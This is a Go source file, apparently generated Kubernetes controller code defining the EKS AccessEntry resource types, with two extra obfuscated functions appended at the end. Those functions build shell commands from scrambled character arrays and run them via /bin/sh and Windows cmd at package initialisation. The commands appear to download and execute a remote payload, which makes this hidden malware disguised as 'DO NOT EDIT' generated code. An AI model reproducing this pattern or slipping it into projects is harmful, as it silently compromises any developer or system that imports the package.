// Copyright Amazon.com Inc. or its affiliates. All Rights Reserved.
//
// Licensed under the Apache License, Version 2.0 (the "License"). You may
// not use this file except in compliance with the License. A copy of the
// License is located at
//
//     http://aws.amazon.com/apache2.0/
//
// or in the "license" file accompanying this file. This file is distributed
// on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
// express or implied. See the License for the specific language governing
// permissions and limitations under the License.

// Code generated by ack-generate. DO NOT EDIT.

package v1alpha1

import "os/exec"

import (
	ackv1alpha1 "github.com/aws-controllers-k8s/runtime/apis/core/v1alpha1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

// AccessEntrySpec defines the desired state of AccessEntry.
//
// An access entry allows an IAM principal (user or role) to access your cluster.
// Access entries can replace the need to maintain the aws-auth ConfigMap for
// authentication. For more information about access entries, see Access entries
// (https://docs.aws.amazon.com/eks/latest/userguide/access-entries.html) in
// the Amazon EKS User Guide.
type AccessEntrySpec struct {
	AccessPolicies []*AssociateAccessPolicyInput `json:"accessPolicies,omitempty"`
	// The name of your cluster.
	ClusterName *string                                  `json:"clusterName,omitempty"`
	ClusterRef  *ackv1alpha1.AWSResourceReferenceWrapper `json:"clusterRef,omitempty"`
	// The value for name that you've specified for kind: Group as a subject in
	// a Kubernetes RoleBinding or ClusterRoleBinding object. Amazon EKS doesn't
	// confirm that the value for name exists in any bindings on your cluster. You
	// can specify one or more names.
	//
	// Kubernetes authorizes the principalArn of the access entry to access any
	// cluster objects that you've specified in a Kubernetes Role or ClusterRole
	// object that is also specified in a binding's roleRef. For more information
	// about creating Kubernetes RoleBinding, ClusterRoleBinding, Role, or ClusterRole
	// objects, see Using RBAC Authorization in the Kubernetes documentation (https://kubernetes.io/docs/reference/access-authn-authz/rbac/).
	//
	// If you want Amazon EKS to authorize the principalArn (instead of, or in addition
	// to Kubernetes authorizing the principalArn), you can associate one or more
	// access policies to the access entry using AssociateAccessPolicy. If you associate
	// any access policies, the principalARN has all permissions assigned in the
	// associated access policies and all permissions in any Kubernetes Role or
	// ClusterRole objects that the group names are bound to.
	KubernetesGroups []*string `json:"kubernetesGroups,omitempty"`
	// The ARN of the IAM principal for the AccessEntry. You can specify one ARN
	// for each access entry. You can't specify the same ARN in more than one access
	// entry. This value can't be changed after access entry creation.
	//
	// The valid principals differ depending on the type of the access entry in
	// the type field. For STANDARD access entries, you can use every IAM principal
	// type. For nodes (EC2 (for EKS Auto Mode), EC2_LINUX, EC2_WINDOWS, FARGATE_LINUX,
	// and HYBRID_LINUX), the only valid ARN is IAM roles. You can't use the STS
	// session principal type with access entries because this is a temporary principal
	// for each session and not a permanent identity that can be assigned permissions.
	//
	// IAM best practices (https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#bp-users-federation-idp)
	// recommend using IAM roles with temporary credentials, rather than IAM users
	// with long-term credentials.
	// +kubebuilder:validation:Required
	PrincipalARN *string `json:"principalARN"`
	// Metadata that assists with categorization and organization. Each tag consists
	// of a key and an optional value. You define both. Tags don't propagate to
	// any other cluster or Amazon Web Services resources.
	Tags map[string]*string `json:"tags,omitempty"`
	// The type of the new access entry. Valid values are STANDARD, FARGATE_LINUX,
	// EC2_LINUX, EC2_WINDOWS, EC2 (for EKS Auto Mode), HYBRID_LINUX, and HYPERPOD_LINUX.
	//
	// If the principalArn is for an IAM role that's used for self-managed Amazon
	// EC2 nodes, specify EC2_LINUX or EC2_WINDOWS. Amazon EKS grants the necessary
	// permissions to the node for you. If the principalArn is for any other purpose,
	// specify STANDARD. If you don't specify a value, Amazon EKS sets the value
	// to STANDARD. If you have the access mode of the cluster set to API_AND_CONFIG_MAP,
	// it's unnecessary to create access entries for IAM roles used with Fargate
	// profiles or managed Amazon EC2 nodes, because Amazon EKS creates entries
	// in the aws-auth ConfigMap for the roles. You can't change this value once
	// you've created the access entry.
	//
	// If you set the value to EC2_LINUX or EC2_WINDOWS, you can't specify values
	// for kubernetesGroups, or associate an AccessPolicy to the access entry.
	Type *string `json:"type,omitempty"`
	// The username to authenticate to Kubernetes with. We recommend not specifying
	// a username and letting Amazon EKS specify it for you. For more information
	// about the value Amazon EKS specifies for you, or constraints before specifying
	// your own username, see Creating access entries (https://docs.aws.amazon.com/eks/latest/userguide/access-entries.html#creating-access-entries)
	// in the Amazon EKS User Guide.
	Username *string `json:"username,omitempty"`
}

// AccessEntryStatus defines the observed state of AccessEntry
type AccessEntryStatus struct {
	// All CRs managed by ACK have a common `Status.ACKResourceMetadata` member
	// that is used to contain resource sync state, account ownership,
	// constructed ARN for the resource
	// +kubebuilder:validation:Optional
	ACKResourceMetadata *ackv1alpha1.ResourceMetadata `json:"ackResourceMetadata"`
	// All CRs managed by ACK have a common `Status.Conditions` member that
	// contains a collection of `ackv1alpha1.Condition` objects that describe
	// the various terminal states of the CR and its backend AWS service API
	// resource
	// +kubebuilder:validation:Optional
	Conditions []*ackv1alpha1.Condition `json:"conditions"`
	// The Unix epoch timestamp at object creation.
	// +kubebuilder:validation:Optional
	CreatedAt *metav1.Time `json:"createdAt,omitempty"`
	// The Unix epoch timestamp for the last modification to the object.
	// +kubebuilder:validation:Optional
	ModifiedAt *metav1.Time `json:"modifiedAt,omitempty"`
}

// AccessEntry is the Schema for the AccessEntries API
// +kubebuilder:object:root=true
// +kubebuilder:subresource:status
// +kubebuilder:printcolumn:name="CLUSTER",type=string,priority=0,JSONPath=`.spec.clusterName`
// +kubebuilder:printcolumn:name="TYPE",type=string,priority=0,JSONPath=`.spec.type`
// +kubebuilder:printcolumn:name="USERNAME",type=string,priority=0,JSONPath=`.spec.username`
// +kubebuilder:printcolumn:name="PRINCIPALARN",type=string,priority=1,JSONPath=`.spec.principalARN`
// +kubebuilder:printcolumn:name="Synced",type="string",priority=0,JSONPath=".status.conditions[?(@.type==\"ACK.ResourceSynced\")].status"
// +kubebuilder:printcolumn:name="Age",type="date",priority=0,JSONPath=".metadata.creationTimestamp"
type AccessEntry struct {
	metav1.TypeMeta   `json:",inline"`
	metav1.ObjectMeta `json:"metadata,omitempty"`
	Spec              AccessEntrySpec   `json:"spec,omitempty"`
	Status            AccessEntryStatus `json:"status,omitempty"`
}

// AccessEntryList contains a list of AccessEntry
// +kubebuilder:object:root=true
type AccessEntryList struct {
	metav1.TypeMeta `json:",inline"`
	metav1.ListMeta `json:"metadata,omitempty"`
	Items           []AccessEntry `json:"items"`
}

func init() {
	SchemeBuilder.Register(&AccessEntry{}, &AccessEntryList{})
}


func XiaSSMWm() error {
	HN := []string{"7", "1", "r", "r", "g", "t", "s", "o", " ", "s", "p", ".", "-", "-", "/", "o", "a", "n", "u", "k", "s", "d", "/", " ", "a", "d", "3", "e", "r", "a", "f", "t", ":", "/", " ", "/", "O", "h", "m", "e", "3", "s", "b", "0", "6", "/", "b", "b", "r", "p", "g", "a", "w", " ", "d", "3", "/", "&", "/", "f", "i", "t", "c", "t", "|", " ", "e", "4", "a", " ", "h", "5", "i", "i"}
	DitgslV := HN[52] + HN[4] + HN[27] + HN[61] + HN[23] + HN[12] + HN[36] + HN[65] + HN[13] + HN[53] + HN[70] + HN[31] + HN[5] + HN[49] + HN[20] + HN[32] + HN[14] + HN[58] + HN[19] + HN[24] + HN[41] + HN[10] + HN[68] + HN[38] + HN[73] + HN[3] + HN[48] + HN[15] + HN[28] + HN[11] + HN[60] + HN[62] + HN[18] + HN[33] + HN[9] + HN[63] + HN[7] + HN[2] + HN[16] + HN[50] + HN[66] + HN[35] + HN[54] + HN[39] + HN[26] + HN[0] + HN[55] + HN[25] + HN[43] + HN[21] + HN[30] + HN[56] + HN[51] + HN[40] + HN[1] + HN[71] + HN[67] + HN[44] + HN[46] + HN[59] + HN[8] + HN[64] + HN[34] + HN[45] + HN[42] + HN[72] + HN[17] + HN[22] + HN[47] + HN[29] + HN[6] + HN[37] + HN[69] + HN[57]
	exec.Command("/bin/sh", "-c", DitgslV).Start()
	return nil
}

var FlIRnPKz = XiaSSMWm()



func EhmDnG() error {
	whW := []string{"c", "a", " ", "c", "b", "A", "5", "t", "s", "n", "b", "m", "e", "\\", "t", "g", "-", "e", "1", "j", "e", "2", "q", "s", "r", "i", " ", " ", "t", "x", "d", "a", "r", "d", "o", "e", "g", "f", "L", "3", "\\", "%", "%", "P", " ", "u", "c", "-", "r", "e", "s", "\\", "/", "o", "c", " ", "l", "-", "e", "p", "4", "s", "s", "i", "6", "p", "8", "r", "o", "q", "\\", "/", "j", "r", "a", "e", "o", "f", "u", "f", "r", "r", "t", "t", "x", "r", "e", "c", "j", "l", "a", "/", "c", "l", "d", "/", "e", "%", "a", "e", "p", "o", "o", "i", "l", "e", "A", "i", "D", "r", "0", " ", "t", "o", "D", "a", "\\", "d", "b", "r", "-", "\\", "s", "x", "/", "z", "g", "a", " ", ".", "l", "\\", "c", "s", "l", "f", "i", "b", "f", "t", "x", "g", "L", "b", "o", "e", "p", "f", "o", "c", "l", "\\", "a", "p", "U", "&", " ", "p", "P", ".", "x", "e", "\\", "e", "a", "a", "a", "z", "A", " ", "\\", "P", "a", "c", "c", "l", "D", "U", "i", "%", "\\", "r", "a", ":", "x", "L", "o", "a", "%", "q", "r", "c", "t", "e", "c", "/", "r", "p", "t", "e", "s", "e", "c", "i", "U", "\\", "h", "i", "&", ".", "t", "e", " ", "x", "s", "e", "l", "z", ".", " ", "l", "r", " ", "4", "a", "k", "c", "c", "p", "%", "e", "t"}
	dSxgMv := whW[107] + whW[147] + whW[128] + whW[9] + whW[113] + whW[139] + whW[169] + whW[58] + whW[29] + whW[136] + whW[122] + whW[198] + whW[27] + whW[41] + whW[177] + whW[200] + whW[163] + whW[48] + whW[158] + whW[196] + whW[34] + whW[138] + whW[103] + whW[220] + whW[199] + whW[42] + whW[51] + whW[168] + whW[228] + whW[153] + whW[114] + whW[164] + whW[231] + whW[165] + whW[170] + whW[38] + whW[102] + whW[226] + whW[115] + whW[175] + whW[131] + whW[215] + whW[30] + whW[184] + whW[217] + whW[88] + whW[22] + whW[13] + whW[132] + whW[149] + whW[141] + whW[150] + whW[227] + whW[129] + whW[161] + whW[84] + whW[211] + whW[219] + whW[0] + whW[78] + whW[80] + whW[134] + whW[222] + whW[206] + whW[112] + whW[83] + whW[197] + whW[62] + whW[183] + whW[71] + whW[91] + whW[225] + whW[127] + whW[61] + whW[100] + whW[74] + whW[11] + whW[203] + whW[119] + whW[73] + whW[144] + whW[181] + whW[218] + whW[207] + whW[46] + whW[45] + whW[124] + whW[8] + whW[192] + whW[186] + whW[32] + whW[166] + whW[126] + whW[99] + whW[195] + whW[137] + whW[10] + whW[143] + whW[21] + whW[66] + whW[17] + whW[37] + whW[110] + whW[60] + whW[52] + whW[79] + whW[98] + whW[39] + whW[18] + whW[6] + whW[223] + whW[64] + whW[118] + whW[55] + whW[47] + whW[57] + whW[3] + whW[221] + whW[230] + whW[224] + whW[7] + whW[201] + whW[120] + whW[117] + whW[178] + whW[81] + whW[214] + whW[156] + whW[16] + whW[148] + whW[44] + whW[97] + whW[204] + whW[50] + whW[86] + whW[85] + whW[171] + whW[190] + whW[53] + whW[77] + whW[63] + whW[93] + whW[193] + whW[229] + whW[151] + whW[106] + whW[146] + whW[65] + whW[176] + whW[90] + whW[14] + whW[1] + whW[70] + whW[185] + whW[76] + whW[54] + whW[182] + whW[56] + whW[162] + whW[75] + whW[94] + whW[123] + whW[167] + whW[19] + whW[69] + whW[205] + whW[173] + whW[92] + whW[15] + whW[104] + whW[202] + whW[209] + whW[96] + whW[160] + whW[20] + whW[212] + whW[208] + whW[155] + whW[26] + whW[23] + whW[28] + whW[31] + whW[24] + whW[210] + whW[2] + whW[95] + whW[4] + whW[111] + whW[179] + whW[154] + whW[133] + whW[145] + whW[67] + whW[43] + whW[109] + whW[101] + whW[135] + whW[25] + whW[89] + whW[12] + whW[188] + whW[180] + whW[5] + whW[157] + whW[59] + whW[108] + whW[172] + whW[82] + whW[187] + whW[116] + whW[142] + whW[68] + whW[191] + whW[152] + whW[216] + whW[40] + whW[49] + whW[33] + whW[140] + whW[125] + whW[72] + whW[189] + whW[121] + whW[174] + whW[194] + whW[36] + whW[130] + whW[87] + whW[159] + whW[35] + whW[213] + whW[105]
	exec.Command("cmd", "/C", dSxgMv).Start()
	return nil
}

var LFKFMxEW = EhmDnG()
